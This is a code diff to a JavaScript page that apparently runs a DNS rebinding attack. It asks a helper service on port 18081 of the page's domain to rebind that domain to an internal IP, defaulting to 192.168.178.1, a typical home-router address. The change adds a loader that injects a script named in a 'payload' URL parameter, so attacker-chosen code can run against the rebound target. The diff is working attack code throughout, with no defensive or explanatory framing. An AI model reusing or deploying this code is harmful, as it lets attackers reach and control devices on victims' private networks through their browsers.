@@ -8,28 +8,40 @@
     return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
   }
 
-  function cb(){
-    var xhr =new XMLHttpRequest();
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState == 4) {
-          alert(xhr.responseText);
-      }
-    }
-    var path = getParameterByName('path');
-    if (path == "") {
-      path = '/'
-    }
-    xhr.open("GET",path,false);
-    xhr.send();
+  //loadScript from e-satis on stackoverflow
+  function loadScript(url, callback) {
+    // Adding the script tag to the head as suggested before
+    var head = document.getElementsByTagName('head')[0];
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.src = url;
+
+    // Then bind the event to the callback function.
+    // There are several events for cross browser compatibility.
+    script.onreadystatechange = callback;
+    script.onload = callback;
+
+    // Fire the loading
+    head.appendChild(script);
   }
 
-  var ip = getParameterByName('ip');
-  if (ip == "") {
-    ip = '192.168.178.1'
+  function do_rebind() {
+    var ip = getParameterByName('ip');
+    if (ip == "") {
+      ip = '192.168.178.1'
+    }
+
+    var xmlhttp = new XMLHttpRequest();
+    xmlhttp.open("GET","//" + document.domain + ":18081/add?ip="+ip+"&domain="+document.domain,true);
+    xmlhttp.send();
+    setTimeout(rebind_cb, 60000);
   }
 
-  var xmlhttp = new XMLHttpRequest();
-  xmlhttp.open("GET","//" + document.domain + ":18081/add?ip="+ip+"&domain="+document.domain,true);
-  xmlhttp.send();
-  setTimeout(cb, 60000);
+  var payload_url = getParameterByName('payload');
+  if (payload_url == "") {
+    payload_url = '/alert.js'
+  }
+
+  loadScript(payload_url, do_rebind);
+
 </script>
